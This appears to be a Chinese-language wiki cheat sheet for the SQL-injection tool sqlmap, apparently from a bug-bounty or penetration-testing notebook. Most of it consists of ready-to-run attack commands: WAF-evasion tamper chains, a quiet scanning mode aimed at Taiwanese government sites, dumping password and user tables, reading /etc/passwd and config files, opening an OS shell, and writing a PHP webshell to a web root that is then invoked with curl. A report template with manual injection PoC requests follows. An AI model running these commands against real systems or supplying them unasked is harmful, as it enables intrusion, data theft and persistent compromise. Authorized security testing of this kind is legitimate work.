---
type: wiki
category: tool
tool: sqlmap
status: active
last-updated: 2026-04-21
source: https://github.com/sqlmapproject/sqlmap
---

# Tool: sqlmap（SQL Injection 自動化）

> **用途：** 最強的 SQL Injection 自動化工具。支援 error-based / boolean-based / time-based / UNION / stacked / out-of-band。
> 能抓 DB / 表 / 欄位 / 資料 + 寫 shell（依 DBMS 權限）。

## 安裝

```bash
# 官方
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git ~/sqlmap
alias sqlmap='python3 ~/sqlmap/sqlmap.py'

# brew
brew install sqlmap

# 確認版本
sqlmap --version
```

## 基本用法

```bash
# GET 參數
sqlmap -u "https://target.com/page.php?id=1" --batch

# POST 參數
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" --batch

# 從 Burp 存的 request file
sqlmap -r req.txt --batch

# 指定測試的 param
sqlmap -u "https://target/page.php?id=1&cat=all" -p id --batch

# 指定 DB 類型（加速）
sqlmap -u "https://target/page.php?id=1" --dbms=mysql --batch
```

## 必學 flag

| Flag | 用途 |
|------|------|
| `-u URL` | GET URL |
| `--data='a=b'` | POST data |
| `-r req.txt` | Burp raw request |
| `-p param` | 只測指定 param |
| `--dbms=mysql` | 指定 DB（加速） |
| `--level 3` | 測試深度（1-5，預設 1） |
| `--risk 2` | 風險（1-3，預設 1） |
| `--technique=BEUSTQ` | B=Boolean E=Error U=Union S=Stacked T=Time Q=Query |
| `--batch` | 自動 yes 所有問題 |
| `--random-agent` | 隨機 UA |
| `--proxy http://127.0.0.1:8080` | Burp proxy |
| `--tamper=script1,script2` | WAF bypass |
| `--delay 3` | 每次 request 延遲 |
| `--timeout 30` | Timeout |
| `--retries 2` | 失敗重試 |
| `--threads 5` | 平行度 |
| `-v 1` | Verbose level |

## 資料抽取 flag

| Flag | 用途 |
|------|------|
| `--current-user` | 當前 DB user |
| `--current-db` | 當前 DB |
| `--is-dba` | 是否 DBA |
| `--privileges` | 當前使用者權限 |
| `--dbs` | 列出所有 DB |
| `--tables -D dbname` | 列出某 DB 的所有表 |
| `--columns -T table -D db` | 列出欄位 |
| `--dump -T table -D db` | dump 整張表 |
| `--dump-all` | dump 全部（小心） |
| `--count -D db` | 每張表的 row 數 |
| `--schema` | DB 結構 |
| `--search -C password` | 找有 "password" 欄位的表 |
| `--sql-shell` | 進 SQL shell |
| `--os-shell` | 試著拿 OS shell（高權限）|
| `--file-read=/etc/passwd` | 讀檔 |
| `--file-write=local.txt --file-dest=/var/www/uploaded.txt` | 寫檔 |

## 推薦組合

### 1. 快速確認有無 SQLi

```bash
sqlmap -u "https://target.com/page.php?id=1" \
  --batch \
  --level 2 \
  --risk 1 \
  --random-agent
```

### 2. 深度測試（確認 vuln 後）

```bash
sqlmap -u "https://target.com/page.php?id=1" \
  --batch \
  --level 5 \
  --risk 3 \
  --technique=BEUST \
  --random-agent
```

### 3. 抓 DB 結構

```bash
# 列 DB
sqlmap -u "https://target/page.php?id=1" --dbs --batch

# 找密碼欄位
sqlmap -u "https://target/page.php?id=1" --search -C password,token,secret --batch

# dump users 表
sqlmap -u "https://target/page.php?id=1" -D target_db -T users --dump --batch
```

### 4. WAF bypass（sqlmap tamper）

```bash
# MySQL
sqlmap -u "https://target/page.php?id=1" \
  --tamper=between,randomcase,space2comment,charencode \
  --random-agent \
  --delay 3 \
  --batch

# MSSQL
sqlmap -u "https://target/page.php?id=1" \
  --tamper=between,randomcase,space2mssqlblank,equaltolike \
  --batch

# 超激進（對頑固 WAF）
sqlmap -u "https://target/page.php?id=1" \
  --tamper=between,randomcase,space2plus,charunicodeencode,versionedmorekeywords \
  --delay 5 \
  --threads 1 \
  --batch
```

### 5. Time-based blind（沒錯誤訊息時）

```bash
sqlmap -u "https://target/page.php?id=1" \
  --technique=T \
  --time-sec 5 \
  --batch
```

### 6. 透過 Burp Repeater 送

```bash
# 1. Burp 右鍵 request → Copy to file → req.txt
# 2. sqlmap 讀：
sqlmap -r req.txt --batch --random-agent
```

### 7. POST JSON 注入

```bash
# JSON body 的 SQLi
sqlmap -u "https://target/api/login" \
  --data='{"username":"admin","password":"test*"}' \
  --headers="Content-Type: application/json" \
  --batch

# * 標記要測試的 param 位置
```

## Tamper scripts（WAF bypass）

常用：

| Tamper | 用途 |
|--------|------|
| `between` | 用 `BETWEEN` 取代 `=` |
| `randomcase` | 關鍵字隨機大小寫 |
| `space2comment` | 空白 → `/**/` |
| `space2plus` | 空白 → `+` |
| `space2mysqlblank` | 空白 → `%0B` `%0C` |
| `space2mssqlblank` | MSSQL 版 |
| `charencode` | URL encode 特殊字元 |
| `charunicodeencode` | Unicode encode |
| `versionedmorekeywords` | MySQL `/*!50000... */` |
| `versionedkeywords` | MySQL `/*!...*/` |
| `apostrophenullencode` | `'` → `%00%27` |
| `equaltolike` | `=` → `LIKE` |

列出所有：
```bash
sqlmap --list-tampers
```

## 政府案低噪音模式

```bash
sqlmap -u "https://target.gov.tw/page.php?id=1" \
  --batch \
  --random-agent \
  --delay 5 \
  --timeout 30 \
  --retries 1 \
  --threads 1 \
  --level 2 \
  --risk 1 \
  --tamper=between,randomcase \
  -v 1
```

## 後利用

### 1. SQL shell

```bash
sqlmap -u target --sql-shell --batch

sql-shell> SELECT @@version;
sql-shell> SELECT * FROM users WHERE username='admin';
sql-shell> SELECT load_file('/etc/passwd');  -- MySQL
```

### 2. OS shell（需要 DBA）

```bash
sqlmap -u target --os-shell --batch

os-shell> id
os-shell> whoami
os-shell> cat /etc/passwd
```

### 3. 讀檔

```bash
sqlmap -u target --file-read=/etc/passwd --batch
sqlmap -u target --file-read=/var/www/html/config.php --batch
```

### 4. 寫檔（webshell）

```bash
# 先寫一個 shell
echo '<?php system($_GET["c"]); ?>' > shell.php

# 上傳
sqlmap -u target \
  --file-write=shell.php \
  --file-dest=/var/www/html/uploads/shell.php \
  --batch

# 驗證
curl "https://target/uploads/shell.php?c=id"
```

## 節省測試時間

### 1. 用 `--batch` 跳過所有互動

### 2. 用 `--flush-session` 避免舊資料干擾

```bash
sqlmap -u target --flush-session --batch
```

### 3. 用 `--level` 和 `--risk` 控制深度

- `level 1 risk 1` — 最快，約 10 payload
- `level 3 risk 2` — 常用平衡
- `level 5 risk 3` — 最全面但慢

### 4. 指定 DBMS

```bash
# 知道是 MySQL 就加
sqlmap -u target --dbms=mysql --batch
```

### 5. 用 `--technique` 限制

```bash
# 只試 error + union（快）
sqlmap -u target --technique=EU --batch

# 只試 time-based（慢但無痕）
sqlmap -u target --technique=T --batch
```

## 從 gf sqli 的結果批次掃

```bash
# gf 分類後
gf sqli < endpoints.txt > gf_sqli.txt

# 批次
while read -r url; do
  echo "=== $url ==="
  sqlmap -u "$url" --batch --level 1 --risk 1 --random-agent --technique=BE 2>&1 | \
    grep -E "Type:|Payload:|injectable"
done < gf_sqli.txt
```

## 報告寫法

```markdown
## 漏洞概述
https://target.gov.tw/search.php?q=test 存在 boolean-based SQLi。

## 重現步驟
```bash
sqlmap -u "https://target.gov.tw/search.php?q=test" \
  --batch --level 3 --risk 2 --technique=B --random-agent

# 輸出:
# Parameter: q (GET)
# Type: boolean-based blind
# Title: AND boolean-based blind - WHERE or HAVING clause
# Payload: q=test' AND 1=1 AND '1'='1
```

## PoC（手動）
```bash
# 基準
curl -s "https://target.gov.tw/search.php?q=test" | wc -c
# 12345

# True condition
curl -s "https://target.gov.tw/search.php?q=test' AND 1=1--" | wc -c
# 12345

# False condition
curl -s "https://target.gov.tw/search.php?q=test' AND 1=2--" | wc -c
# 9876
```

## 影響
- DB name: `xxx`（已驗證 `--current-db`）
- DB user 權限：`SELECT`（非 DBA，不能寫檔）
- 142 張表可讀取
- 其中 `users` 表含明文密碼欄位（`password` column）

## Severity
P1-CRIT（可 dump PII）
```

## 關聯文件

- [14-waf-bypass-commands.md](14-waf-bypass-commands.md) §sqlmap tamper
- [15-nuclei-attack-templates.md](15-nuclei-attack-templates.md) §SQLi
- [13-hunter-crawl-chain.md](13-hunter-crawl-chain.md) — gf sqli 產生 URL list
